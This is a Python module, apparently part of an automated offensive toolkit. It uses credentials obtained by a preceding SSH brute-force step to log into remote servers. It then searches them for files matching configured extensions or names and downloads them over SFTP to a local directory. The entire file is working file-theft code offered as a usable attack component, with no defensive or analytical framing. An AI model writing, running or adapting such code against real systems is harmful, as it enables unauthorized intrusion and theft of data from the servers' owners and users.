"""
steal_files_ssh.py - This script connects to remote SSH servers using provided credentials, searches for specific files, and downloads them to a local directory.
"""

import os
import paramiko
import logging
from shared import SharedData
from logger import Logger
from actions.base_steal import BaseSteal

logger = Logger(name="steal_files_ssh.py", level=logging.DEBUG)

b_class = "StealFilesSSH"
b_module = "steal_files_ssh"
b_status = "steal_files_ssh"
b_parent = "SSHBruteforce"
b_port = 22


class StealFilesSSH(BaseSteal):
    protocol_name = "ssh"
    credential_file_attr = "sshfile"

    def connect(self, ip, username, password):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.WarningPolicy())
            ssh.connect(ip, username=username, password=password)
            logger.info(f"Connected to {ip} via SSH with username {username}")
            return ssh
        except Exception as e:
            logger.error(f"Error connecting to SSH on {ip} with username {username}: {e}")
            raise

    def find_items(self, ssh, dir_path):
        try:
            stdin, stdout, stderr = ssh.exec_command(f'find {dir_path} -type f')
            files = stdout.read().decode().splitlines()
            matching_files = []
            for file in files:
                if self.shared_data.orchestrator_should_exit:
                    logger.info("File search interrupted.")
                    return []
                if any(file.endswith(ext) for ext in self.shared_data.steal_file_extensions) or \
                   any(file_name in file for file_name in self.shared_data.steal_file_names):
                    matching_files.append(file)
            logger.info(f"Found {len(matching_files)} matching files in {dir_path}")
            return matching_files
        except Exception as e:
            logger.error(f"Error finding files in directory {dir_path}: {e}")
            raise

    def steal_item(self, ssh, remote_file, local_dir):
        try:
            sftp = ssh.open_sftp()
            self.connected = True
            remote_dir = os.path.dirname(remote_file)
            rel_path = os.path.relpath(remote_dir, '/')
            if rel_path.startswith('..') or os.path.isabs(rel_path):
                raise ValueError("Path traversal detected")
            local_file_dir = os.path.join(local_dir, rel_path)
            os.makedirs(local_file_dir, exist_ok=True)
            local_file_path = os.path.join(local_file_dir, os.path.basename(remote_file))
            sftp.get(remote_file, local_file_path)
            logger.success(f"Downloaded file from {remote_file} to {local_file_path}")
            sftp.close()
        except Exception as e:
            logger.error(f"Error stealing file {remote_file}: {e}")
            raise

    def disconnect(self, ssh):
        ssh.close()


if __name__ == "__main__":
    try:
        shared_data = SharedData()
        steal_files_ssh = StealFilesSSH(shared_data)
    except Exception as e:
        logger.error(f"Error in main execution: {e}")
